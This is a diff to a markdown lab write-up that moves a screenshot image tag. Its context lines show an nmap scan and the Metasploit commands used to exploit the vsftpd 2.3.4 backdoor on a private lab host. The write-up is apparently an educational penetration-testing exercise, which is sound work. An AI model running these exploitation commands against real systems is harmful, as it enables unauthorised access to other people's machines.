@@ -54,6 +54,7 @@ Command used: nmap -sV 192.168.56.101
 Results: Identified 23 open ports, including the notoriously vulnerable vsftpd 2.3.4 service.
 
 ![Root shell](root_shell.png)
+<img width="1152" height="666" alt="metasploit_success" src="https://github.com/user-attachments/assets/c8641114-ffdf-461a-be95-a307983fff34" />
 
 ### Phase 2: Exploitation (Metasploit)
 I exploited the vsftpd 2.3.4 backdoor using the Metasploit Framework.
@@ -64,7 +65,6 @@ msfconsole
 use exploit/unix/ftp/vsftpd_234_backdoor
 set RHOSTS 192.168.56.101
 run
-<img width="1152" height="666" alt="metasploit_success" src="https://github.com/user-attachments/assets/c8641114-ffdf-461a-be95-a307983fff34" />
 
 ## Lessons Learned
 
